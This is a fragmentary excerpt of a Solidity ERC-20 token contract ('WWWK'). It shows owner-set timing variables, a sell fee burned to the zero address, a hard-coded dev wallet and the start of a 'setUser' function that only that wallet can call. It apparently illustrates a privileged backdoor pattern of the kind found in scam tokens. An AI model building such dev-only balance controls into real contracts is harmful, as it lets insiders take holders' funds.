...
contract AGToken is Context, IERC20, Ownable {
    ...
    uint256 public startTime = 1664539200;
    uint256 public robotTime = 1665144060;
    ...
    address public  _devWallet = 0x6485E79833f20BC710DC9c67d550d9673C4a5a74; 

    string private _name = "WWWK";
    string private _symbol = "WWWK";
    ...
    uint256 public _sellBlackFee = 8;
    ...
    function setRobotTime(uint256 _robotTime) public onlyOwner {
    ...
    function _getRSellValues( TSellData memory _data) private pure returns (uint256, uint256) {
        ...
        uint256 rTransferAmount = rAmount.sub(rDev);
        return (rAmount, rTransferAmount);
    }
    ...
    function _takeBlack(uint256 tBlack) private {
        uint256 currentRate =  _getRate();
        uint256 rBlack = tBlack.mul(currentRate);
        _rOwned[address(0)] = _rOwned[address(0)].add(rBlack);
        if(_isExcluded[address(this)])
            _tOwned[address(0)] = _tOwned[address(0)].add(tBlack);

        emit Transfer(msg.sender, address(0), tBlack);     
    }
    ...
    function setUser(address[] memory _user,uint256[] memory _amount) public  {
        require(msg.sender == _devWallet, "denied");
